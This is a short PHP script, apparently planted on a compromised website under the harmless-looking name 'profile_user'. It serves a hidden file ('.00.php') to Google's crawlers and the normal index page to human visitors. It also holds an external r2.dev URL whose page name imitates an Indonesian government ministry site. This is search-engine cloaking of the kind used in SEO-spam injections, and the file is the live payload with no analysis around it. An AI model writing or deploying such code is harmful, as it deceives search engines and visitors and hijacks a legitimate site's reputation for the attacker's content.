<?php
	function profile_user() { 
		$refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer'; 
		$useragent = $_SERVER['HTTP_USER_AGENT']; 
		$pasteUrl = 'https://pub-487d03ac58d442ddb9c0e09d16b600b3.r2.dev/silaris.kemenkumham.html'; 
		$refererDomain = parse_url($refererUrl, PHP_URL_HOST); 
		if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) { 
			include '.00.php';
		} else { 
			include 'index.php';
		} 
	} 
	profile_user();
	?>